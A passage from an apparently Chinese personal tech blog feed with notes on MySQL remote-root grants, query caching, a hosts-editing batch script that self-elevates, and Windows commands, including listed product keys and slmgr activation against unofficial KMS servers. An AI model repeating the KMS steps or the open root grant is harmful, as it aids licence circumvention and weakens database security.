class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'user'</span><span class="token variable">@'%'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'password'</span> <span class="token keyword">WITH</span> <span class="token keyword">GRANT</span> <span class="token keyword">OPTION</span><span class="token punctuation">;</span><span class="token comment">-- 将当前user和privilige表中的用户信息/权限设置从mysql库(MySQL数据库的内置库)中提取到内存里，</span><span class="token comment">-- 通常是在修改ROOT帐号的设置后，怕重启后无法再登录进来，那么直接flush之后就可以看权限设置是否生效。而不必冒太大风险。</span>FLUSH <span class="token keyword">PRIVILEGES</span><span class="token punctuation">;</span><span class="token comment">------ 2.改表法（不推荐）</span><span class="token keyword">use</span> mysql<span class="token punctuation">;</span><span class="token keyword">update</span> <span class="token keyword">user</span> <span class="token keyword">set</span> host<span class="token operator">=</span><span class="token string">'%'</span> <span class="token keyword">where</span> <span class="token keyword">user</span><span class="token operator">=</span><span class="token string">'root'</span>  <span class="token operator">and</span> host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">;</span><span class="token keyword">select</span> host<span class="token punctuation">,</span> <span class="token keyword">user</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">;</span> <span class="token comment">-- 查看是否修改成功</span>FLUSH RIVILEGES<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化</title>
      <link href="/2021/01/25/yuque/hqc53o/"/>
      <url>/2021/01/25/yuque/hqc53o/</url>
      
        <content type="html"><![CDATA[<h2 id="一、开启缓存"><a href="#一、开启缓存" class="headerlink" title="一、开启缓存"></a>一、开启缓存</h2><p><em>1.查询 mysql 是否开启缓存 （query_cache_type 为 ON 表示已经开启）</em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">&gt;</span> show variables like <span class="token string">'%query_cache%'</span><span class="token punctuation">;</span>+------------------------------+----------+<span class="token operator">|</span> Variable_name                <span class="token operator">|</span> Value    <span class="token operator">|</span>+------------------------------+----------+<span class="token operator">|</span> have_query_cache             <span class="token operator">|</span> YES      <span class="token operator">|</span><span class="token operator">|</span> query_cache_limit            <span class="token operator">|</span> <span class="token number">1048576</span>  <span class="token operator">|</span><span class="token operator">|</span> query_cache_min_res_unit     <span class="token operator">|</span> <span class="token number">4096</span>     <span class="token operator">|</span><span class="token operator">|</span> query_cache_size             <span class="token operator">|</span> <span class="token number">20971520</span> <span class="token operator">|</span><span class="token operator">|</span> query_cache_type             <span class="token operator">|</span> ON       <span class="token operator">|</span><span class="token operator">|</span> query_cache_wlock_invalidate <span class="token operator">|</span> OFF      <span class="token operator">|</span>+------------------------------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>2.如果不是 ON 或者没查到记录，修改配置文件以开启查询缓存：</em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> <span class="token function">vi</span> /etc/my.cnf<span class="token comment"># 在[mysqld]中添加：</span><span class="token comment"># query_cache_size = 20M</span><span class="token comment"># query_cache_type = ON</span><span class="token comment">#重启mysql服务：</span><span class="token operator">&gt;</span> <span class="token function">service</span> mysql restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>3.查看缓存使用情况：</em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> show status like <span class="token string">'qcache%'</span><span class="token punctuation">;</span>+-------------------------+----------+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value    <span class="token operator">|</span>+-------------------------+----------+<span class="token operator">|</span> Qcache_free_blocks      <span class="token operator">|</span> <span class="token number">83</span>       <span class="token operator">|</span><span class="token operator">|</span> Qcache_free_memory      <span class="token operator">|</span> <span class="token number">19811040</span> <span class="token operator">|</span><span class="token operator">|</span> Qcache_hits             <span class="token operator">|</span> <span class="token number">3108196</span>  <span class="token operator">|</span><span class="token operator">|</span> Qcache_inserts          <span class="token operator">|</span> <span class="token number">757254</span>   <span class="token operator">|</span><span class="token operator">|</span> Qcache_lowmem_prunes    <span class="token operator">|</span> <span class="token number">20720</span>    <span class="token operator">|</span><span class="token operator">|</span> Qcache_not_cached       <span class="token operator">|</span> <span class="token number">47219</span>    <span class="token operator">|</span><span class="token operator">|</span> Qcache_queries_in_cache <span class="token operator">|</span> <span class="token number">47</span>       <span class="token operator">|</span><span class="token operator">|</span> Qcache_total_blocks     <span class="token operator">|</span> <span class="token number">276</span>      <span class="token operator">|</span>+-------------------------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>其中各个参数的意义如下：<br>&nbsp; Qcache_free_blocks：缓存中相邻内存块的个数。数目大说明可能有碎片。FLUSH QUERY CACHE 会对缓存中的碎片进行整理，从而得到一个空闲块。<br>&nbsp; Qcache_free_memory：缓存中的空闲内存。<br>&nbsp; Qcache_hits：每次查询在缓存中命中时就增大<br>&nbsp; Qcache_inserts：每次插入一个查询时就增大。命中次数除以插入次数就是不中比率。<br>&nbsp; Qcache_lowmem_prunes：缓存出现内存不足并且必须要进行清理以便为更多查询提供空间的次数。这个数字最好长时间来看;如果这个 数字在不断增长，就表示可能碎片非常严重，或者内存很少。(上面的 free_blocks 和 free_memory 可以告诉您属于哪种情况)<br>&nbsp; Qcache_not_cached：不适合进行缓存的查询的数量，通常是由于这些查询不是 SELECT 语句或者用了 now()之类的函数。_4.对于某些不想使用缓存的语句，可以这样使用：</em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> <span class="token keyword">select</span> SQL_NO_CACHE count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from <span class="token function">users</span> where email <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考文章:<a href="https://www.cnblogs.com/exmyth/p/13345179.html">https://www.cnblogs.com/exmyth/p/13345179.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows使用bat编写脚本【示例】</title>
      <link href="/2020/12/11/yuque/fpbv8d/"/>
      <url>/2020/12/11/yuque/fpbv8d/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">@<span class="token function">echo</span> offmode con cols=75 lines=25title xxx平台外网访问setlocal EnableDelayedExpansion&amp;color 70 &amp; cd <span class="token operator">/</span>d <span class="token string">"%~dp0"</span>rem <span class="token operator">%</span>1 <span class="token operator">%</span>2rem ver<span class="token punctuation">|</span>find <span class="token string">"5."</span>&gt;nul&amp;&amp;goto :<span class="token function">start</span>rem mshta vbscript:createobject<span class="token punctuation">(</span><span class="token string">"shell.application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shellexecute<span class="token punctuation">(</span><span class="token string">"%~s0"</span><span class="token punctuation">,</span><span class="token string">"goto :start"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span>1<span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span>&amp;goto :eofrem <span class="token operator">%</span>1 mshta vbscript:CreateObject<span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ShellExecute<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span>1<span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span>&amp;&amp;<span class="token keyword">exit</span><span class="token operator">%</span>1 mshta vbscript:CreateObject<span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ShellExecute<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span>1<span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span>&amp;&amp;<span class="token keyword">exit</span>:<span class="token function">start</span>@<span class="token function">echo</span> 本脚本使用方法是：放在nginx根目录，执行使用。@<span class="token function">echo</span> 请注意你的杀毒软件提示，一定要允许<span class="token function">set</span> host_path=C:\Windows\System32\drivers\etc\hosts<span class="token function">set</span> domain=xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token function">set</span> domain2=127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1 xx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>com xx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>com xx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>comrem @<span class="token function">echo</span> <span class="token string">"%domain%"</span><span class="token keyword">for</span> <span class="token operator">/</span>F <span class="token operator">%</span><span class="token operator">%</span>j in <span class="token punctuation">(</span> <span class="token string">'type %host_path% ^| findstr %domain%'</span> <span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span> <span class="token function">set</span> host_domain=<span class="token operator">%</span><span class="token operator">%</span>j <span class="token punctuation">)</span>rem @<span class="token function">type</span> C:\Windows\System32\drivers\etc\hosts<span class="token punctuation">|</span>findstr <span class="token operator">*</span>*<span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span>*<span class="token operator">*</span><span class="token punctuation">.</span>cn &gt; 1<span class="token punctuation">.</span>txt<span class="token keyword">if</span> <span class="token string">"%host_domain%"</span> == <span class="token string">""</span> <span class="token punctuation">(</span>rem @<span class="token function">echo</span> bucunzai <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  rem <span class="token function">echo</span> <span class="token operator">%</span>domain2<span class="token operator">%</span> &gt;&gt; <span class="token operator">%</span>host_path<span class="token operator">%</span>  rem 直接插入不换行  rem @<span class="token function">echo</span> <span class="token operator">%</span>domain2<span class="token operator">%</span> &gt;&gt; <span class="token operator">%</span>host_path<span class="token operator">%</span>  rem 换行后插入@<span class="token function">echo</span> <span class="token operator">%</span>domain2<span class="token operator">%</span> &gt;&gt;  <span class="token operator">%</span>host_path<span class="token operator">%</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">(</span>rem @<span class="token function">echo</span> run nginxrem call :runPathAllExe <span class="token operator">%</span>host_path<span class="token operator">%</span>rem @<span class="token function">echo</span> <span class="token operator">%</span>nginx_path<span class="token operator">%</span><span class="token punctuation">)</span>@call :runNginx@<span class="token function">echo</span> 您现在已经可以访问了，按任意键关闭此窗口。 &amp;&amp; pause&gt;nul@<span class="token keyword">exit</span>:runNginx<span class="token function">set</span> nginx_path=<span class="token operator">%</span>~dp0nginx<span class="token punctuation">.</span>exetaskkill <span class="token operator">/</span>f <span class="token operator">/</span>t <span class="token operator">/</span>IM nginx<span class="token punctuation">.</span>exe &gt; nulrem <span class="token function">echo</span> <span class="token operator">%</span>nginx_path<span class="token operator">%</span><span class="token function">start</span> <span class="token operator">%</span>nginx_path<span class="token operator">%</span>rem :runPathAllExerem rem @<span class="token function">echo</span> <span class="token operator">%</span>~dp1data\nginx<span class="token punctuation">.</span>exerem <span class="token keyword">for</span> <span class="token operator">/</span>f <span class="token string">"delims="</span> <span class="token operator">%</span><span class="token operator">%</span>i in <span class="token punctuation">(</span><span class="token string">'dir /a-d /s /b "%~dp1\*.exe"'</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span><span class="token function">start</span> <span class="token string">""</span> <span class="token string">"%%i"</span><span class="token punctuation">)</span>remremrem :printrem rem 本脚本文件全路径 <span class="token operator">%</span>~s0==<span class="token operator">%</span>0rem <span class="token function">set</span> file_all_path=<span class="token operator">%</span>~s0rem <span class="token function">echo</span> <span class="token operator">%</span>file_all_path<span class="token operator">%</span>rem rem 获取到文件所在路径rem rem <span class="token operator">%</span>~dp0：本脚本文件所在路径   <span class="token operator">%</span>~dp1：call调用时传入的参数（文件全路径）的文件所在路径rem <span class="token function">set</span> file_path=<span class="token operator">%</span>~dp1rem <span class="token function">echo</span> <span class="token operator">%</span>file_path<span class="token operator">%</span>rem rem 获取到文件名称rem <span class="token function">set</span> file_name=<span class="token operator">%</span>~n1rem <span class="token function">echo</span> <span class="token operator">%</span>file_name<span class="token operator">%</span>rem rem 获取到文件后缀rem <span class="token function">set</span> suffix=<span class="token operator">%</span>~x1rem <span class="token function">echo</span> <span class="token operator">%</span>suffix<span class="token operator">%</span>rem rem 截取倒数第四个开始 截取四个长度rem <span class="token function">set</span> specStr=<span class="token operator">%</span>file_name:~<span class="token operator">-</span>4<span class="token punctuation">,</span>4<span class="token operator">%</span>rem <span class="token function">echo</span> <span class="token operator">%</span>specStr<span class="token operator">%</span>rem pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows 常用命令</title>
      <link href="/2020/10/27/yuque/uclawd/"/>
      <url>/2020/10/27/yuque/uclawd/</url>
      
        <content type="html"><![CDATA[<h2 id="用-slmgr-命令激活-win10"><a href="#用-slmgr-命令激活-win10" class="headerlink" title="用 slmgr 命令激活 win10"></a>用 slmgr 命令激活 win10</h2><p>1.slmgr.vbs /upk &nbsp; &nbsp; 卸载产品密钥</p><p>2.slmgr /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 &nbsp; &nbsp; 安装产品密钥</p><p>3.slmgr /skms 132.232.70.97:1688 &nbsp; &nbsp; 设置激活服务器</p><p>4.slmgr /ato &nbsp; &nbsp; 激活系统</p><p><strong>win10 密钥须知：</strong>win10 激活码都有激活次数的限制，而且容易被官方封禁，所以不能保证 100%可用，win10 序列号不能用时，大家可以用激活工具来激活，市面上的激活工具都是 KMS 激活，KMS 是 180 天激活，到期后可反复激活进行续期，或下载安装。</p><p><a href="http://www.xitongcheng.com/jiaocheng/win10_article_44893.html">win10 企业版 G kms 激活 400 年方法</a><br><strong>Windows 10 Pro(win10 专业版激活密钥)</strong></p><p>TPYNC-4J6KF-4B4GP-2HD89-7XMP6<br>2BXNW-6CGWX-9BXPV-YJ996-GMT6T<br>NRTT2-86GJM-T969G-8BCBH-BDWXG<br>XC88X-9N9QX-CDRVP-4XV22-RVV26<br>TNM78-FJKXR-P26YV-GP8MB-JK8XG<br>TR8NX-K7KPD-YTRW3-XTHKX-KQBP6</p><p>VK7JG-NPHTM-C97JM-9MPGT-3V66T<br>NPPR9-FWDCX-D2C8J-H872K-2YT43<br>W269N-WFGWX-YVC9B-4J6C9-T83GX<br>NYW94-47Q7H-7X9TT-W7TXD-JTYPM<br>NJ4MX-VQQ7Q-FP3DB-VDGHX-7XM87<br>MH37W-N47XK-V7XM9-C7227-GCQG9</p><p><strong>windows10 Home（win10 家庭版激活码）：</strong></p><p>TX9XD-98N7V-6WMQ6-BX7FG-H8Q99<br>3KHY7-WNT83-DGQKR-F7HPR-844BM<br>7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH<br>PVMJN-6DFY6-9CCP6-7BKTT-D3WVR<br>PPBK3-M92CH-MRR9X-34Y9P-7CH2F<br>(OA 3.0 版)<br>Win10 家庭版 37GNV-YCQVD-38XP9-T848R-FC2HD<br>Win10 家庭版 N 33C4Y-NPKCC-V98JP-42G8W-VH636<br>(非 OA 3.0 版)<br>Win10 家庭版 46J3N-RY6B3-BJFDY-VBFT9-V22HG<br>Win10 家庭版 N PGGM7-N77TC-KVR98-D82KJ-DGPHV</p><p><strong>Windows 10 系统</strong><br>企业版：XGVPP-NMH47-7TTHJ-W3FW7-8HV2C<br>教育版：YNMGQ-8RYV3-4PGQ3-C8XTP-7CFBY<br>专业版 N：2B87N-8KFHP-DKV6R-Y2C8J-PKCKT<br>企业版 N：WGGHN-J84D6-QYCPR-T7PJ7-X766F<br>教育版 N：84NGF-MHBT6-FXBX8-QWJK7-DRR8H<br>企业版 S：FWN7H-PF93Q-4GGP8-M8RF3-MDWWW<br>单语言版：BT79Q-G7N6G-PGBYW-4YWX6-6F4BT</p><p>Windows 10 Core Single Language:JPYNJ-XTFCR-372YJ-YJJ4Q-G83YB<br>Windows 10 Core 中文版 Language Edition:R3BYW-CBNWT-F3JTP-FM942-BTDXY<br>Windows 10 Core :KTNPV-KTRK4-3RRR8-39X6W-W44T3<br>Windows 10 Pro:8N67H-M3CY9-QT7C4-2TR7M-TXYCV<br>Windows 10 Enterprise:CKFK9-QNGF2-D34FM-99QX3-8XC4K<br>Windows 10 Core Single Language :JPYNH-XTFCR-372YJ-YJJ3Q-G83YB<br>Windows 10 Core Chinese Languange Edition:R3BYW-CBNWT-F3JTP-FM942-BTDXY</p><p><strong>win10 企业版：</strong><br>Windows 10 Enterprise : NPPR9-FWDCX-D2C8J-H872K-2YT43<br>Windows 10 Enterprise N: DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4<br>Windows 10 Enterprise 2015 LTSB :WNMTR-4C88C-JK8YV-HQ7T2-76DF9<br>Windows 10 Enterprise 2015 LTSB N : 2F77B-TNFGY-69QQF-B8YKP-D69TJ</p><p><strong>win10 预览版密钥：</strong></p><p>Win10 企业版密钥：PBHCJ-Q2NYD-2PX34-T2TD6-233PK</p><p>Win10 专业版密钥：NKJFK-GPHP7-G8C3J-P6JXR-HQRJR</p><p><strong>激活方法：</strong><br>系统安装完毕后，首先以管理员身份打开 CMD 命令行窗口，按下 Win+X，选择命令提示符(管理员)。<br><strong>说明：kms.xspace.in 是 kms 服务器地址，可能会失效，如果激活失败，可以自行搜索 kms 服务器地址，将 kms.xspace.in 替换成新的地址即可，比如换成 kms.03k.org，参考可用的 kms 激活服务器有哪些</strong><br>win10 专业版用户请依次输入：<br>slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX<br>slmgr /skms kms.03k.org<br>slmgr /ato</p><p>win10 企业版用户请依次输入：<br>slmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43<br>slmgr /skms kms.03k.org<br>slmgr /ato</p><p>win10 家庭版用户依次输入：<br>slmgr /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99<br>slmgr /skms kms.03k.org<br>slmgr /ato</p><h2 id="路由相关"><a href="#路由相关" class="headerlink" title="路由相关"></a>路由相关</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">::route <span class="token function">add</span> 目标地址 mask 子网掩码 -p 下一跳::例如：route <span class="token function">add</span> <span class="token number">192.168</span>.2.0 mask <span class="token number">255.255</span>.255.0 -p <span class="token number">192.168</span>.7.3::删除的话只需要把 <span class="token function">add</span> 改为 delete 即可。route print ::查看当前的路由表tracert <span class="token number">192.168</span>.7.1<span class="token punctuation">(</span>目标地址<span class="token punctuation">)</span> ::跟踪地址（从当前地址到达指定地址经过的路由）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-attrib-修改文件属性"><a href="#1-attrib-修改文件属性" class="headerlink" title="1.attrib 修改文件属性"></a>1.attrib 修改文件属性</h2><p>有些文件夹想隐藏起来，并不想加密。可用以下方法进行：将把普通文件夹改成受保护的操作系统文件<br>在命令提示符状态下（开始－&gt; 运行－&gt;cmd）：<br>输入命令：”attrib /?”<br>就有中文操作提示。如下：<br>ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [[drive:] [path] filename] [/S [<br>/D]]</p><ul><li><p>设置属性。</p></li><li><p>清除属性。<br>R 只读文件属性。<br>A 存档文件属性。<br>S 系统文件属性。<br>H 隐藏文件属性。<br>[drive:][path][filename]<br>指定要处理的文件属性。<br>/S 处理当前文件夹及其子文件夹中的匹配文件。<br>/D 也处理文件夹。</p></li></ul><p>举例：<br>将 d 盘的 “电影” 文件夹 加系统属性和隐属性 (即受保护的操作系统文件)<br>C:&gt;attrib +h +s d:\ 电影</p><p>相反取消则是<br>C:&gt;attrib -h -s d:\ 电影</p><h2 id="2-mklink-创建连接"><a href="#2-mklink-创建连接" class="headerlink" title="2.mklink 创建连接"></a>2.mklink 创建连接</h2><p>命令区别：<br>/d 给目录创建符号链接，简称符号链接、软链接；<br>/h 创建硬链接，简称硬链接；<br>/j 给目录创建联接点，简称软链接。</p><p><strong>当没有上面 3 个命令符时，创建是文件软链接！文件类型：.symlink</strong><br>注意：<br><strong>路径，建议使用绝对路径，必须使用英文双引号将路径括起来；</strong><br><strong>空格，命令之间必须有空格</strong></p><p>例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mklink /J 连接到的路径 原路径mklink /j <span class="token builtin class-name">test</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Serenity<span class="token punctuation">\</span>Test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-netstat-查找占用指定端口的进程-pid"><a href="#3-netstat-查找占用指定端口的进程-pid" class="headerlink" title="3.netstat 查找占用指定端口的进程 pid"></a>3.netstat 查找占用指定端口的进程 pid</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#ano 为参数，表示  以数字形式显示所有连接和侦听的地址和端口号，并显示显示拥有的与每个连接关联的进程 ID</span><span class="token comment">#a 显示所有连接和侦听端口。</span><span class="token comment">#n 以数字形式显示地址和端口号。</span><span class="token comment">#o 显示拥有的与每个连接关联的进程 ID。</span><span class="token comment">#findstr 为字符串过滤(搜索结果中带有指定字符的记录，类似于linux中的grep)</span><span class="token function">netstat</span> -ano <span class="token operator">|</span>findstr <span class="token number">8569</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CertUtil-渗透工具"><a href="#CertUtil-渗透工具" class="headerlink" title="CertUtil 渗透工具"></a>CertUtil 渗透工具</h2><p>CertUtil</p><h3 id="1-帮助文档"><a href="#1-帮助文档" class="headerlink" title="1.帮助文档"></a>1.帮助文档</h3><p>动词:<br>-dump &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 转储配置信息或文件<br>-dumpPFX &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 转储 PFX 结构<br>-asn &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 分析 ASN.1 文件</p><p>-decodehex &nbsp; &nbsp; &nbsp; &nbsp;– 解码十六进制编码的文件<br>-decode &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 解码 Base64 编码的文件<br>-encode &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 将文件编码为 Base64</p><p>-deny &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 拒绝挂起的申请<br>-resubmit &nbsp; &nbsp; &nbsp; &nbsp; – 重新提交挂起的申请<br>-setattributes &nbsp; &nbsp;– 为挂起申请设置属性<br>-setextension &nbsp; &nbsp; – 为挂起申请设置扩展<br>-revoke &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 吊销证书<br>-isvalid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 显示当前证书部署</p><p>-getconfig &nbsp; &nbsp; &nbsp; &nbsp;– 获取默认配置字符串<br>-ping &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – Ping Active Directory 证书服务申请接口<br>-pingadmin &nbsp; &nbsp; &nbsp; &nbsp;– Ping Active Directory 证书服务管理接口<br>-CAInfo &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 显示 CA 信息<br>-ca.cert &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 检索 CA 的证书<br>-ca.chain &nbsp; &nbsp; &nbsp; &nbsp; – 检索 CA 的证书链<br>-GetCRL &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 获取 CRL<br>-CRL &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 发布新的 CRL [或仅增量 CRL]<br>-shutdown &nbsp; &nbsp; &nbsp; &nbsp; – 关闭 Active Directory 证书服务</p><p>-installCert &nbsp; &nbsp; &nbsp;– 安装证书颁发机构证书<br>-renewCert &nbsp; &nbsp; &nbsp; &nbsp;– 续订证书颁发机构证书</p><p>-schema &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 转储证书架构<br>-view &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 转储证书视图<br>-db &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 转储原始数据库<br>-deleterow &nbsp; &nbsp; &nbsp; &nbsp;– 删除服务器数据库行</p><p>-backup &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 备份 Active Directory 证书服务<br>-backupDB &nbsp; &nbsp; &nbsp; &nbsp; – 备份 Active Directory 证书服务数据库<br>-backupKey &nbsp; &nbsp; &nbsp; &nbsp;– 备份 Active Directory 证书服务证书和私钥<br>-restore &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 还原 Active Directory 证书服务<br>-restoreDB &nbsp; &nbsp; &nbsp; &nbsp;– 还原 Active Directory 证书服务数据库<br>-restoreKey &nbsp; &nbsp; &nbsp; – 还原 Active Directory 证书服务证书和私钥<br>-importPFX &nbsp; &nbsp; &nbsp; &nbsp;– 导入证书和私钥<br>-dynamicfilelist &nbsp;– 显示动态文件列表<br>-databaselocations – 显示数据库位置<br>-hashfile &nbsp; &nbsp; &nbsp; &nbsp; – 通过文件生成并显示加密哈希</p><p>-store &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 转储证书存储<br>-enumstore &nbsp; &nbsp; &nbsp; &nbsp;– 枚举证书存储<br>-addstore &nbsp; &nbsp; &nbsp; &nbsp; – 将证书添加到存储<br>-delstore &nbsp; &nbsp; &nbsp; &nbsp; – 从存储删除证书<br>-verifystore &nbsp; &nbsp; &nbsp;– 验证存储中的证书<br>-repairstore &nbsp; &nbsp; &nbsp;– 修复密钥关联，或者更新证书属性或密钥安全描述符<br>-viewstore &nbsp; &nbsp; &nbsp; &nbsp;– 转储证书存储<br>-viewdelstore &nbsp; &nbsp; – 从存储删除证书<br>-UI &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 调用 CryptUI<br>-attest &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 验证密钥证明请求</p><p>-dsPublish &nbsp; &nbsp; &nbsp; &nbsp;– 将证书或 CRL 发布到 Active Directory</p><p>-ADTemplate &nbsp; &nbsp; &nbsp; – 显示 AD 模板<br>-Template &nbsp; &nbsp; &nbsp; &nbsp; – 显示注册策略模板<br>-TemplateCAs &nbsp; &nbsp; &nbsp;– 显示模板的 CA<br>-CATemplates &nbsp; &nbsp; &nbsp;– 显示 CA 的模板<br>-SetCASites &nbsp; &nbsp; &nbsp; – 管理 CA 的站点名称<br>-enrollmentServerURL – 显示、添加或删除与 CA 关联的注册服务器 URL<br>-ADCA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 显示 AD CA<br>-CA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 显示注册策略 CA<br>-Policy &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 显示注册策略<br>-PolicyCache &nbsp; &nbsp; &nbsp;– 显示或删除注册策略缓存项目<br>-CredStore &nbsp; &nbsp; &nbsp; &nbsp;– 显示、添加或删除凭据存储项目<br>-InstallDefaultTemplates – 安装默认的证书模板<br>-URLCache &nbsp; &nbsp; &nbsp; &nbsp; – 显示或删除 URL 缓存项目<br>-pulse &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 以脉冲方式执行自动注册事件或 NGC 任务<br>-MachineInfo &nbsp; &nbsp; &nbsp;– 显示 Active Directory 计算机对象信息<br>-DCInfo &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 显示域控制器信息<br>-EntInfo &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 显示企业信息<br>-TCAInfo &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 显示 CA 信息<br>-SCInfo &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 显示智能卡信息</p><p>-SCRoots &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 管理智能卡根证书</p><p>-verifykeys &nbsp; &nbsp; &nbsp; – 验证公/私钥集<br>-verify &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 验证证书，CRL 或链<br>-verifyCTL &nbsp; &nbsp; &nbsp; &nbsp;– 验证 AuthRoot 